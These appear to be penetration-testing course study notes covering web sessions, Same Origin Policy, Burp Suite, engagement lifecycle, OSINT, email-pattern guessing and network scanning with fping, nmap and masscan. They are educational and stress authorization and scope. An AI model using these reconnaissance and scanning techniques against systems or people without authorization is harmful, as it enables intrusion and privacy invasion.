            - Sometimes the web developer prefers to store some information on the server side instead of the client side; this happens to hide the application logic or just to avoid the back and forth data transmission typical of cookies.
            - Sessions are a mechanism that lets the website store variables specific for a given visit on the server side.
            - Each user session is identified by a session id, or token, which the server assigns to the client.
            - The client then presents this ID for each subsequent request, thus being recognized by the server.
            - By means of the session ID, the server retrieves the state of the client and all its associated variables. The server stores Sessions IDs inside text files in its storage. 
            - Session cookies:
                - Session cookies just contain a single parameter value pair referring to the session.
                - Websites running PHP install session cookies by using the "PHPSESSID" parameter name, while JSP websites use 'JSESSIONID". Each development language has its own default session parameter name.
                - Of course, the web developer can also choose to use a custom parameter name.
                - If needed, servers install session cookies after a browser performs some kind of activity, like:
                    - Opening a specific page
                    - Changing settings in the web application
                    - Logging in 
                - The browser then uses the cookie in subsequent requests. A session could contain many variables, so sending a small cookie keeps the bandwidth usage low.
            - Session IDs can also be transmitted via GET requests.
        - Same Origin Policy
            - Same Origin Policy (SOP) is a critical point of web application security.
            - This policy prevent JavaScript code from getting or setting properties on a resource coming from a different origin.
            - The browser uses:
                - Protocol, Hostname, and Port
            - To determine if JavaScript can access a resource: Hostname, port, and protocol must match.
            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F0IwZqfosuL.png?alt=media&token=e0f4d8ed-696c-469d-965f-52196895ca55)
            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FsrntflxgM-.png?alt=media&token=ac36d417-67d8-4c10-b2aa-9098dfed5fae)
            - The entire web application security is based on Same Origin Policy.
            - If a script on domain A was able to read content on domain B, it would be possible to steal clients' information and mount a number of very dangerous attacks.
        - Burp Suite
            - Intercepting Proxies:
                - An intercepting proxy is a tool that lets you analyze and modify any request, and any response exchange between an HTTP client and a server.
                - By intercepting HTTP messages, a pentester can study a web application behavior and manually test for vulnerabilities.
                - Proxies are fundamental while analyzing web applications and will become your best friend for web-app testing.
                - Do not confuse intercepting proxies with common web proxy servers like Squid. Proxy servers have different purposes: bandwidth optimization, content filtering and more.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FGTFhSpwRep.png?alt=media&token=0d7c76c3-cc87-4fc4-b90e-fb0b1f164631)
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F-sdf6Hwvcl.png?alt=media&token=bf528751-5d26-4302-9ecd-cede17e3c75c)
            - Burp Proxy:
                - Burp suite will let you:
                    - Intercept requests and responses between your browser and the web server.
                    - Build request manually.
                    - Crawl a website by automatically visiting every page in a website.
                    - Fuzz web applications by sending them patterns of valid and invalid inputs to test their behavior.
                - By using Burp, you can intercept and modify requests coming from your browsers before they are sent to the remote server.
                - You can modify the header and the body of a message by hand or automatically.
            - Burp Proxy Configuration
            - Burp Repeater:
                - Burp Repeater, which lets you manually build raw HTTP requests.
    - 140.Penetration Testing
        - Introduction
            - A penetration tester, much like an experienced hacker, performs a deep investigation of the remote system's security flaws. This activity requires methodology and skills.
            - Penetration testers, unlike hackers, must test for any and all vulnerabilities, not just the ones that may grant them root access to a system. Penetration testing is not about getting root.
            - Furthermore, Penetration Testers cannot destroy their client's infrastructure; professional pentesting requires a thorough understanding of attack vectors and their potential.
        - Lifecycle of a Penetration Test
            - A Penetration Test is both a complex and very delicate process.
            - You have to thoroughly test your client's systems to find any and every vulnerability while, at the same time, you must guarantee that your activity will have the least impact possible on the production systems and services; this is crucial and is the difference between a real professional and an amateur.
            - It is important to carefully select the right tools and techniques to use during your tests to avoid overloading your client systems and networks.
            - Considering the penetration test as a process, rather than an unstructured block of tasks, ensures that every potential vulnerability or security weakness gets tested, with the lowest possible overhead.
            - The success of a task depends on the success of the preceding tasks.
            - Penetration Testing process:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7Vgh-1HfzG.png?alt=media&token=3e37a544-5e79-44f0-a12b-ecc38d62cf89)
                - All the details about the penetration test are established during the Engagement phase.
                    - At the Quotation stage, a professional pentester defines the fee for the penetration test of a network, a web application or the whole organization.
                    - The fee will vary according to:
                        - Type of engagement (Black Box, Gray Box, etc.)
                        - How time-consuming the engagement is
                        - The complexity of the applications and services in scope
                        - The number of targets (IP addresses, domains, etc.)
                    - Evaluating and quoting these aspects requires experience that you will gain in the field.
                    - If you are not able to quantify the amount of work required by an engagement, you can provide an hourly fee.
                - Proposal Submittal:
                    - The best way to win a job is by providing a sound and targeted proposal.
                    - You should write the proposal keeping in mind the client's needs and infrastructure.
                    - The proposal should include:
                        - The understanding of the client's needs. In other words, what you understood of their requirements.
                        - The approach and methodology you want to use, like the use of automated scanning tools, manual testing, onsite testing and any other information that fits.
                    - Furthermore, it should also include:
                        - How you want to address their needs and what kind of value the pentest will bring to their business. Think in terms of risks and benefits, like business continuity, improved confidentiality, avoidance of money and reputation loss due to data breaches.
                        - A quotation in terms of price and an estimate of the time required to perform your job.
                    - Finally, any proposal must address:
                        - The type of engagement. Is your activity a penetration test or vulnerability assessment? Is it remote or onsite? And so on.
                        - The scope of engagement in terms of IP addresses, network blocks, domain names or any other information useful in defining the scope.
                - Staying in Scope:
                    - As a professional penetration tester, you should be aware that your client might not have enough knowledge of some IT areas, especially when communicating the target to you.
                    - You should always make sure that the target of your engagement is the property of your client. Be careful especially when asked to perform an engagement (e.g., on a single website)
                    - If it is a part of shared hosting, you must not conduct an assessment on such a target unless you are given written permission from the hosting provider.
                    - Always analyze the target scope and verify if it's your client's property and if you have written permission to conduct the assessment.
                    - You should take any possible out of scope incidents very seriously; in many countries, such unauthorized activity might be considered breaking the law.
                - Incident Handling:
                    - An incident is an unplanned and unwanted situation that affects the client's environment and disrupt its services.
                    - When conduction a penetration test, you should take into consideration that incidents happen.
                    - Even when sticking to all of the best practices and performing every test very carefully, there is always a likelihood of damaging the tested assets, especially when you have little knowledge about the tested environment and cannot predict the result of every single operation.
                    - You should always aim not to damage the target.
                    - In case of planning some intensive or risky tests, you might want to communicate with the customer. For instance, if there are some preferred hours when possible service stoppage will be less painful to them.
                    - It is a best practise to have an incident handling procedure.
                    - Many large organizations already have such processes set up, while the smaller ones might not have implemented such procedures within them.
                    - An incident handling procedure is a set of instructions that need to be executed by both you and your customer on how to proceed when an incident (e.g., service damage or unavailability) occurs.
                    - If there is no fixed procedure established by the client, the simplest way to handle an incident is to have an emergency contact, a technical person on the client's site that is available (via phone or another form of contact) that might coordinate further incident handling for the customer's company.
                - Legal Work:
                    - Once the previous steps are completed, you have to deal with the legal responsibilities of each party involved; this is done by producing some legal paperwork.
                    - Sometimes you will need to involve a lawyer as information security laws vary a lot from country to country. Other times, professional insurance is required, and it is strongly advised to have it as it only costs a few hundred dollars per year and can turn out to be very useful just in case.
                    - Companies usually want you to sign one or more Non-Disclosure Agreements (NDAs). These documents enforce your full confidentiality regarding any information or confidential data you may come across during your engagement.
                    - It does not matter if you have been exposed to private data, information on secret processes or products, it is your duty to keep them private and encrypted on your PC.
                    - With an NDA, a company ensures that you will not divulge any confidential information to any third party. Confidentiality is just one of the legal aspects of pentesting. Another key point is outlining what you can and cannot do.
                    - All of the steps seen thus far apply if you are a Freelance Penetration tester. If you work for an IT Security services company, the legal department will deal with it, and your penetration testing process will start from the next step.
                    - Rules of engagement is another document that will define the scope of engagement and will put on paper what you are entitled to do and when; this includes the time window for your tests and your contacts in the client's organization.
                    - You will want these contacts (client's employees or managers) to coordinate activities, or to promptly communicate with if you accidentally break something during your tests.
                    - Once everything is clearly documented, you can move onto the practical part of the engagement, starting from information gathering.
            - Information Gathering:
                - Information gathering is the first and one of the most fundamental stages of a successful penetration test.
                - Most beginners tend to overlook or rush this phase. If you want to perform an effective pentest; do not do that!
                - Information gathering can start once the legal paperwork is complete but not before the beginning of the testing period. You don't want the client to find anything in their logs before that start date.
                - During this stage, you are an investigator who wants to harvest information about the client's company.
                - General Information:
                    - Such information includes:
                        - Board of directors
                        - Investors
                        - Managers and employees
                        - Branch location and addresses
                        - Names and email addresses of the people above.
                    - The above information is extremely useful if Social Engineering is allowed by the rules of engagement, as you will be able to mount effective targeted attacks.
                - Understanding the Business:
                    - As the goal of a penetration test is to mimic the effects of a black hat hacker attack, you need to understand what are the risks involved and what are the client's critical infrastructures.
                    - Having an understanding of the business is a key aspect in understanding what is important for your client; this allows you to know what is critical and vital for the client, thus allowing you to rate the risks associated with a successful attack.
                - Infrastructure Information Gathering:
                    - After collecting the General Information and you have an Understanding of the Business, the Infrastructure Information Gathering can begin.
                    - In this phase, you transform the IP addresses or the domains in scope into actionable information about servers, operating systems and much more.
                    - If the scope is defined as a list of IP addresses, you can move on to the next step.
                    - If the scope is the whole company or some of their domains, you will have to harvest the relevant IP blocks by using WHOIS and other DNS information.
                    - The goal of this phase is to give meaning to every IP address in scope by determining:
                        - If there is alive host or server using it.
                        - If there are one or more websites using that IP address.
                        - What OS is running on the host or the server.
                    - This will help you:
                        - Focus your efforts to actual live clients and servers.
                        - Target your attacks.
                        - Sharpen your tools for the exploitation phase, when you have to find out the vulnerabilities and exploitability of the client systems. 
                - Web Applications:
                    - If there is any web application in scope, in this phase you will harvest:
                        - Domains
                        - Subdomains
                        - Pages (website crawling)
                        - Technologies in use, like PHP, Java, .NET, and so on.
                        - Frameworks and content management systems in use, like Drupal, Joomla, Wordpress, and others.
                    - You should treat web application as completely separate entities, that require a separate study.
                    - You can gather information about web applications by browsing and inspecting through application proxies such as Burp.
            - Footprinting and Scanning:
                - During the Footprinting and Scanning phase, you deepen your knowledge of the in-scope servers and services.
                - Fingerprinting the OS:
                    - Fingerprinting the Operating System of a host not only gives you information about the OS running on the system, but also helps you narrow down the number of potential vulnerabilities to check in the next phases.
                    - There are tools that can make educated guesses about the OS, the version and even the patch level of a remote system.
                    - Those tools exploit some singularities you can find in the network stack implementation of every operating system.
                - Port Scanning:
                    - After having detected and fingerprinted the live hosts, it's time for port scanning
                    - With a scan of live hosts, you can determine which ports are open on a remote system; this is crucial phase of the engagement because any mistake made here will impact the next steps.
                    - Currently, the in reality port scanner is "nmap".
                - Detecting Services:
                    - Knowing that a port is open is just half of the job.
                    - Next, you will need to know what is the service listening on that port!
                    - In fact, knowing just the port is not enough because, a system administrator can configure a service to listen to any TCP or UDP port.
                    - To detect which service is listening on a port, you can use nmap or other fingerprinting tools.
                    - By knowing the services running on a machine, a penetration tester can infer:
                        - The operating system
                        - The purpose of a particular IP address; for example, if it is a server or a client.
                        - The importance of the host in the client's business. For example, an e-commerce enterprise will heavily rely upon its website and its database server.
                        - After a map of the network infrastructure and the services running on it is built, you can start the vulnerability assessment using vulnerability scan and/or manual inspection.
            - Vulnerability Assessment:
                - The vulnerability assessment phase is aimed at building a list of vulnerabilities present on the target systems.
                - the penetration tester has to carry out a vulnerability assessment on each target found in the previous steps.
                - The next phase, exploitation, will go through this list to exploit the systems.
                - The bigger the list, the more the chances to exploit the systems in scope.
                - You can carry out a vulnerability assessment:
                    - Manually by using data collected in the previous phases.
                    - By utilizing automated tools
                - Vulnerability assessment tools are scanner that send probes to the target systems to detect whether a host has some well-known vulnerabilities.
                - Once the vulnerability scan is complete, the scanner will deliver a report that the pentester can use in the exploitation phase.
                - As automated scanners can perform a huge number of probes, it is extremely important to properly configure them leveraging the information collected in the previous steps.
                - Otherwise, the scanner will blindly perform all its probes, even the ones that do not apply to your targets; this would increase the chances of crashing services and would also take more time than necessary to complete.
                - Most of the time this phase is done by using both automated scanners and manual inspection.
                - Automated tools can help carry out a penetration test, but they will not perform a penetration test on their own.
            - Exploitation:
                - At this point, it's time to verify if the vulnerabilities really exist. The exploitation phase takes care of exploitation all the vulnerabilities found during the previous step.
                - During the exploitation phase a penetration tester checks and validates a vulnerability and also widens and increases the pentester's privileges on the target systems and networks.
                - A successful exploit of a machine helps to investigate the target network further, to discover new targets and to repeat the process from the information phase!
                - A penetration test is indeed a cyclic process.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FKFFGllG3VN.png?alt=media&token=55b4c967-0d7a-4c95-abe6-f8b2905c0654)
                - The process ends when there are no more systems and services in-scope to exploit.
                - Remember, a penetration test is used to find any and all vulnerabilities.
            - Reporting:
                - Lastly, the final penetration test report is as important as the whole testing phase, as it is your way to officially deliver and communicate the results of your tests with:
                    - Executives
                    - IT Staff
                    - Development team
                - The report shows and explains the result of your tests and is the actual deliverable of your professional engagement.
                - The Report:
                    - The report must address:
                        - Techniques used
                        - Vulnerabilities found
                        - Exploits used
                        - Impact and risk analysis for each vulnerability
                        - Remediation tips
                    - Targeted tips on how to effectively remediate each vulnerability are the real value for the client.
                    - Remember that the work of a penetration tester is much more appreciated if, other than his elite exploitation skills, it provides useful suggestions and techniques the client can use to resolve their security issues.
                - Consultancy:
                    - Penetration testers are often asked to provide some hours of consultancy after delivering the report; this is an additional service to the client should they need further clarification or help regarding your findings.
                    - After the consultancy step, the engagement is closed and the penetration tester must keep the report encrypted in a safe place, or better yet, destroy it.
            - The Secret of an Effective Pentest:
                - Imagine the systems in scope as a target. The bigger the target, the more chances you have to hit it with your darts.
                - Stages like information gathering and fingerprinting do just that; they make your target wider!
                - In technical jargon, this activity is called "widening the attack surface".
                - Using your time at widening the attack surface is much more valuable than shooting darts at an unknown target. You do not know where to shoot, and you do not know which technique is the best to use.
                - On the other hand, a targeted attack has many more chances to succeed! Your main goal as a pentester is to first increase your chances of success and then shoot your darts.
                - Sticking to the process you've just seen is the real secret for an effective pentest.
                - In fact, highly motivated and experienced hackers spend most of their time investigating their victims and gathering information about them using as many sources as possible this helps them launch highly targeted attacks that do not trigger alarms in the victim's defense system.
                - A successful and stealthy attack is made possible by a deep understanding of the target, which comes from a thorough information gathering phase.
- 02.Preliminary Skills - Programming
    - 210.Introduction to Programming
        - What is Programming
            - Programming basically creates a set of instructions that a computer may follow.
            - It can be used to automate tasks, leaving specific things to be done by a machine instead of human.
            - There are various programming and scripting languages that can be used to achieve this. They may have a different syntax and usage requirements, but their purpose is the same - to help humans by automating tasks.
        - Low and High Level Languages
            - Programming languages can be divided into two main groups:
                - Low-level languages
                - High-level languages
            - The level can tell how close they are to the hardware.
            - Low and high-level languages:
                - Low level languages are interpreted directly by the computer. Their advantage is that you can do almost everything in them, while their disadvantage is their complicated nature that can lead to a vulnerability, if the developer doesn't have a deep understanding of the language's capabilities.
                - High level languages offer ease of the development, but they are less flexible. If there are no available libraries that hold certain functionality, writing custom functionality from scratch might be a very difficult task.
                - An example of a low-level language is assembly, which consists of instructions for the processor itself.
                - On a side note, hackers and penetration testers use the assembly language during their (advanced) exploit development activities.
                - Modern processors execute billions of operations per second, so writing a program using processor instructions might not seem to be worthy of any effort. There are only a few modern software types where such a language might be used, for instance, device drivers.
                - On the other hand, high-level languages offer much more development convenience and support broader operations. Lots of single hardware operations are invisibly managed by the language engine.
                - Java, Python, and Visual Basic are example of high-level languages.
                - However, programs created using high-level languages cannot reside on a bare operating system and will need some software already installed on the system to run.
                - If you are about to create code that will operate directly on computer memory, you should use a lower level language.
                - If you are about to create a fancy graphical interface, you should use a higher level language and its graphical libraries that are available.
        - Programming vs Scripting
            - High level programming languages consist of:
                - Programming languages, and
                - Scripting languages
            - Programming languages require a compiler.
            - After writing code in your language of choice, you need to use a special piece of software called a compiler to convert your plain-text program file into something unreadable by a human, but readable by the language environment. You can program in Java or C++ to experience this.
            - On the other hand, scripting languages are usually interpreted, which means that the software environment installed on your computer can read a plain-text program file the same way that you can, and it can execute the instructions without changing the file in any way.
            - Some examples of such scripting language are Visual Basic, and partially, Python.
        - Basic Concepts
            - Each programming language has its own syntax. You can think of it like grammatic rules in human languages.
            - Syntax may require some instructions to use certain characters; for example, ,,;" at the end of the each statement, while in another language this may not be needed.
            - Variables:
                - Programming also uses variables, which are containers that can be names and filled with data.
                - Depending on the programming language, you may also have to choose the correct variable type. Numbers, words, or single characters are usually stored in different variable types.
            - Functions:
                - Programming languages allow users to create and use their own functions.
                - In short, functions are pieces of code responsible for some repeatable tasks.
                - Functions use arguments (as input) and might return (throws out) a value.
            - Conditional statements:
                - Conditional statements means that there is a condition to be checked and that there is at least on instruction defined on how to proceed further.
            - Loops:
                - Loops are also common on every programming language and are set of instructions that need to be executed numerous times. They are often paired with conditional statements in order to check if they should stop, or if they should repeat its instructions again.
            - Understanding the code:
                - When dealing with a new, unknown programming language that you do not understand, you should always start from checking all the aforementioned basic constructs in the language's manual. This will greatly help you understand what the inspected code does.
    - 220.Programming in C++
        - C++ IDE
            - Download C++ IDE @[here](https://sourceforge.net/projects/orwelldevcpp/)
        - refer original slides
    - 230.Programming in Python
        - refer original slides
        - Network Sockets
            - Network sockets are used in computer networks to exchange data (packets) between two endpoints (from a source to a destination)
    - 240.Command Line Scripting
- 03.Penetration Testing
    - Information Gathering
        - Introduction
            - Information Gathering is the first and one of the most crucial phases of an engagement.
            - It helps you understand the target organization, widen the attack surface and mount efficient and targeted attacks.
        - Open-Source Intelligence
            - Nowadays, you can collect information about a company by exploiting information available on social networks, public sites and by visiting the company websites.
            - Social Networks Information Gathering:
                - Many successful security breaches exploit the weakest link in the security chain: human!
                - With the advent of social networks, hackers can now access information on people and products which were very hard to find only a few years ago.
                - Criminals can (and actually do) now exploit this valuable information to mount sophisticated attacks.
                - You, as a professional penetration tester can do the same, by performing queries on common social networks like Facebook, Twitter, LinkedIn, Google+ and so on. 
                - Given the vast array of social networks out there, the right ones for your engagement depends on the specific client and engagement.
                - While LinkedIn, Twitter, and Facebook are good in terms of a "general purpose" shot, you have to choose between other social networks by understanding not only the target company industry but also some of the interests of its employees.
                    - LinkedIn -- personal and work phone numbers, email addresses, different integrated accounts
                    - Twitter
                    - Facebook
                    - Instagram
            - Public Sites Information Gathering:
                - Social networks are not the only public source of information about companies. There are also many other interesting websites and databases that "leak" valuable information.
                - Crunch Base -- detailed information about founders, investors, employees, buyouts, and acquisitions.
                - Government Sites -- companies that have worked with a government or are currently working with one.
            - Whois
                - Another precious resource is the Whois database. You can use it to get information such as:
                    - Owner name
                    - Street addresses
                    - Email Address
                    - Technical contacts
                - regarding an Internet domain name.
                - You can query the database by using the whois command on Linux and OSX.
            - Browsing Client's Sites:
                - Social networks, public sites and the whois services each give you fragmented information that you can put together to better understand your client's business.
                - Finally, don't forget that browsing your client's actual websites will give you plenty of information about:
                    - Products
                    - Services
                    - Technologies
                    - Company culture
            - Discovering Email Pattern:
                - In case there is not a direct database or any other source of company emails, which often also works as logins to corporate services, you might want to try to identify them yourself.
                - Companies tend to use one certain email schema for every employee; this makes internal communication of a company much easier.
                - If you are able to find a company's employees (i.e., using their official website, LinkedIn, or other social networking sites), you might be able to guess their email address.
                - Many mail systems tend to inform the sender that mail was not delivered because it does not exist.
                - This is an excellent opportunity for a penetration tester to guess corporate email formats.
        - Subdomain Enumeration
            - It's common for websites of the same company to share the same top level domain name. For example, career.company.com, mail.company.com or business.company.com
            - Through subdomain enumeration a penetration tester can possibly identify additional resources of a target.
            - Passive subdomain enumeration - means that we will try to identify subdomains without directly interacting with the target, but through open sources.
            - You can try this by typing the following in Google's search engine `site: company.com`
            - Another open source that can facilitate passive subdomain enumeration is "dnsdumpster.com", that utilizes data from google-indexed subdomains, but also checks sites like Bing or virustotal for similar information.
            - There is also a tool that extends the capabilities of DNS enumeration, called sublist3r
                - In its basic usage, sublist3r will collect DNS data from various sources.
            - The aforementioned subdomain enumeration techniques will help you identify publicly available target assets. Each one of them may be vulnerable to attacks, which should be thouroughly checked during the penetration test. 
        - The Importance of Information Gathering
            - A strong phase of Information Gathering makes the difference between a good and a bad penetration tester.
            - A good penetration tester spends 90% of his time widening the attack surface because he knows this is what it is all about. The other 10% is just a matter of launching the correct commands with the appropriate tool with a high success rate.
            - Your penetration test will be as strong as your weakest skill, so do not underestimate information gathering!
    - Footprinting and Scanning
        - Mapping a Network
            - Ping Sweeping:
                - Ping works by sending one or more special ICMP packets to a host. If the destination host replies with ICMP echo reply packets, then the host is alive.
                - Ping sweeping tools automatically perform the same operation to every host in a subnet or IP range, saving you from typing hundreds or thousands ping of commands.
                - fping is a Linux tool which is an improvides version of the standard ping utility. You can use Fping to perform ping sweeps: installed by default on Kali Linux.
                    - `-a` option forces the tool to show only alive hosts
                    - `-g` option tells the tool that we want to perform a ping sweep instead of a standard ping.
                    - Command would like -- `fping -a -g 10.54.12.0/24` 
                    - When running Fping on a LAN you are directly attached to, even if you use the -a option, you will get some warning messages (ICMP Host Unreachable) about offline hosts.
                    - To suppress those messages, you can redirect the process standard error to `/dev/null`.
                        - `fping -a -g 192.168.82.0 192.168.82.255 2>/dev/null`
                - Nmap Ping Scan:
                    - Nmap (Network Mapper) is an open source tool for network exploration and security auditing. Installed on Kali by default.
                    - You can perform a ping scan by using the `-sn` command line switch. You can specify your targets on the command line in CIDR format as a range and by using wildcard notation.
                    - `# nmap –sn 200.200.0.0/16 
# nmap –sn 200.200.123.1-12 
# nmap –sn 172.16.12.* 
# nmap –sn 200.200.12-13.*`
                    - Moreover, you can save your host list in a file and use the input list `-iL` command line switch -- `nmap -sn -iL hostslist.txt`
                    -  ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7RdKIul6eX.png?alt=media&token=3ba702b7-6a24-4438-a8d3-3b6d928b7497)
            - OS Fingerprinting:
                - Fingerprinting tools send a series of specially crafted requests to the target host.
                - They then examine every bit in the response, creating a signature of the host behavior.
                - Finally, the signature is compared against a database of known operating systems signatures.
                - During a penetration test, you will have to perform this reconnaissance step on every network node, including:
                    - Routers
                    - Firewalls
                    - Hosts
                    - Servers
                    - Printers
                    - And so on...
                - The goal of this phase is to write a table like the following:
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FLXGvnVaOkB.png?alt=media&token=a23a324c-29b2-41f0-ae1c-1b270fda631c)![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FEvLj4kICxo.png?alt=media&token=d972698e-ddab-43bc-9bf6-7094f7d1838c)
                - To perform OS fingerprinting with nmap, you ahve to use `-O` command line option and specify your target(s).
                - You can also add the `-Pn` switch to skip the ping scan if you already know that the targets are alive.
            - Port Scanning:
                - Once network mapping is performed, we know which nodes and associated operating systems, are active on the target network. 
                - We now need a way to discover the daemons and services running on those nodes: port scanning!
                - Port scanning is a process used to determine what TCP and UDP ports are open on target hosts. Moreover, it lets you known which daemon, in terms of software and version, is listening on a specific port.
                - A daemon is a piece of software running on a server to provide a given service. A daemon also listen on a specific port.
                - The ultimate goal of port scanning/service detection is to find the software name and version of the daemons running on each host.
                - Under the Hood of a Port Scanner:
                    - Port scanning utilities, or port scanners, automate probes request and response analysis. These are powerful tools that not only give you information about the targets but also let you detect if there is a firewall between you and the target.
                    - TCP Connect scan:
                        - The simplest way to perform a port scan is trying to connect to every port.
                            - If the scanner receives a RST packet, then the port is closed.
                            - If the scanner can complete the 3-way handshake, then the port is open. After connecting, the scanner sends an RST packet to the target host to abruptly close the connection.
                            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FUQodd_SNL0.png?alt=media&token=49ea9a2e-f903-41de-b7a2-fe0ba030256a)
                            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FeVkuPkkY3F.png?alt=media&token=2fb52cc2-3dfd-42ef-ae18-aa151157f5a1)
                        - Every TCP connect scan probe gets recorded in the daemon logs because, from the application point of view, the probe looks like a legitimate connection.
                        - System administrators can easily detect the scan as they will see a lot of connections to all the services running on a single machine; to prevent that, TCP SYN scans were invented.
                    - TCP SYN Scan:
                        - TCP SYN scans were invented to be stealthy by design
                        - During a SYN scan, the scanner does not perform a full handshake it just sends a SYN packet and analyzes the response coming from the target machine.
                        - The scanner sends a TCP packet with the SYN flag enabled to the destination <host>:<port> pair and:
                            - If it receives a RST packet, then it marks the port as closed.
                            - If the scanner receives an ACK packet, then the port is open. After marking the port as open, the scanner sends an RST packet to the target host to stop the handshake.
                        - As there is no real connection to the destination daemon, a SYN scan cannot be detected by looking at daemons logs. 
                - Scanning with Nmap:
                    - Nmap syntax is very simple, yet powerful:
                    - `nmap [Scan Type(s)] [Options] {target specification}`
                    - Nmap Scan Types:
                        - The most used scan types are:
                            - -sT performs a TCP connect scan
                            - -sS performs a SYN scan
                            - -sV performs a version detection scan
                        - TCP connect scan with nmap -- `nmap -sT <target>`
                        - TCP SYN scan with nmap -- `nmap -sS <target>`
                        - Version scan with nmap -- `nmap -sV <target>`
                            - During a version detection scan, Nmap performs a TCP connect scan and reads from the server the banner of the daemon listening on a port.
                            - If the daemon does not send a banner by itself, Nmap sends some probes to understand what the listening application is. The idea behind this is to guess the application and its version by studying its behavior.
                    - Specifying the Targets:
                        - Nmap has a very flexible syntax to specify your targets. You can use DNS names, IP address lists, CIDR notation, wildcards, ranges, octets lists, and even input files.
                        - By DNS Name:
                            - Specifying targets by their DNS names is just a matter of writing them on the command line. `nmap <scan type> target1.domain.com target2.otherdomain.com`
                        - With an IP addresses list:
                            - You can write a list of IP addresses on the command line -- `nmap <scan type> 192.168.1.45 200.200.14.56`
                        - By using CIDR Notation:
                            - You could also use the CIDR notation if you have to scan one or more networks -- `nmap <scan type> 192.168.1.0/24 10.0.0.0/8`
                        - By using wildcards:
                            - Using wildcards where an asterisk * is converted to the 0-255 range -- `nmap <scan type> 192.168.1.*`
                        - Specifying Ranges:
                            - You can specify an interval for every octet. For example, if you want to scan just a part of a /16 network you could use: `nmap <scan type> 200.200.6-12.*`
                    - Choosing the Ports to Scan:
                        - When you specify one or more targets, by default, Nmap scans the most common ports used on the Internet.
                        - If you want to specify custom ports, you can use the "-p" option.
                        - You can specify your ports as a comma-separated list, or as a port interval.
                        - `nmap -p 21,22 <target>`
                        - `nmap -p 100-1000 <target>`
                    - Discovering Network with Port Scanning:
                        - In your penetration testing career, you might encounter networks that are protected by firewalls and where pings are blocked.
                        - For such cases, you should be armed with at least one backup plan.
                        - It's not uncommon to come across a server that does not respond to pings but has many TCP or UDP ports open.
                        - When using nmap, you can use the "-Pn" switch to force the scan on such a server. (skip ping scanning and treat it as alive)
                        - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Ff1j3NULtOS.png?alt=media&token=f3f7c5db-caac-49b0-904f-9fc71588ae22)
                    - Spotting the firewall:
                        - First, you pay attention to incomplete nmap results. On an open network, if a TCP scan succeeded against a well-known service, like a web server, nmap should not have any difficulty in trying to fingerprint it with -sV switch.
                        - **tcpwrapped** means that the TCP handshake was completed, but the remote host close the connection without receiving any data.
                        - This is an indication that something is blocking connectivity with the target host.
                        - Moreover, you might want to use the nmap **--reason** switch that will show an explanation of why a port is marked open or closed.
                    - Masscan:
                        - Masscan was designed to deal with large networks and to scan thousands of IP addresses at once.
                        - It's like nmap, but a lot faster; however, it might be a bit less accurate. It's up to you which one you will use on a penetration testing assessment.
                        - You could perform host discovery using masscan, and then conduct a detailed scan with nmap against certain interesting hosts.
    - Vulnerability Assessment
        - Vulnerability assessment is a scan of the vulnerabilities found on networks and applications, it is also faster and has a lighter load on the infrastructure.
        - We can say that the vulnerability assessment is more of a linear process as opposed to a penetration test which is more in depth, both in terms of vulnerabilities discovered and vulnerabilities tested.
        - Vulnerability Scanners:
            - A vulnerability assessment, in the same manner as a penetration test, can be carried out both locally and remotely.
            - Checking one or more systems for all the known vulnerabilities would be infeasible so that penetration testers can use a vulnerability scanner.
            - Scanners use a database of known vulnerabilities and security audits to detect the vulnerabilities of a system. scanners perform their probes on:
                - Daemons listening on TCP and UDP ports.
                - Configuration files of operating systems, software suites, network devices, etc.
                - Windows registry entries.
            - The purpose is to find vulnerabilities and mis-configurations. 
            - The scanner's vendor keeps the tool up to date and constantly updates its database with new security checks and vulnerabilities signatures.
            - The more the database is up to date, the better and more relevant the scan results will be.
            - There are a lot of vulnerability scanners out there, like OpenVAS, Nexpose or GFI LAN Guard.
            - Nessus is one of the most popular vulnerability scanners.
        - Manual Testing:
            - If you have to test a custom application, a vulnerability scanner may not be enough; you have to test it manually!
            - Testing a custom application is very similar to testing a web application.
            - Studying custom applications means:
                - Learning and understanding its features
                - Understanding how it exchanges data over the network
                - Understanding how it accesses resources like databases, servers, local and remote files and so on
                - Reverse engineering its logic
        - Nessus
            - Nessus is an easy to use yet powerful vulnerability scanner that works great both on a small and a large company network.
            - It has a free license for non-commercial use.
            - Architecture:
                - Nessus has two components: a client and a server. You will use the client to configure the scans and the server to actually perform the scanning processes and report the results back to the client.
                - The client component provides you with a web interface to configure your scans.
                - The server component performs the scans by sending probes to systems and applications, collecting the responses and matching them against its vulnerability database.
                - You can run both components on the same machine; this is a simple yet effective configuration for a home network or a lab environment.
            - Under the Hood of a Vulnerability Scanner:
                - Every vulnerability scanner roughly performs the same steps during a scan.
                - Port Scanning:
                    - The first step is determining if the target hosts are alive and which ports are open on them; to do that the vulnerability scanner performs a port scan to test the open ports on the systems. The more accurate the port scan is, the more useful results the vulnerability scanner will get.
                - Service Detection:
                    - For every open port found, the vulnerability scanner will send special probes to determine which application (name and version) is running on them.
                - Vulnerabilities Database Lookup:
                    - For each detected service (also known as a daemon), the scanner queries its database looking for known vulnerabilities.
                    - When configuring the scanner, you can configure which vulnerabilities you want to check for.
                - Probing:
                    - During the last step, the scanner sends probes to verify if the vulnerability actually exists.
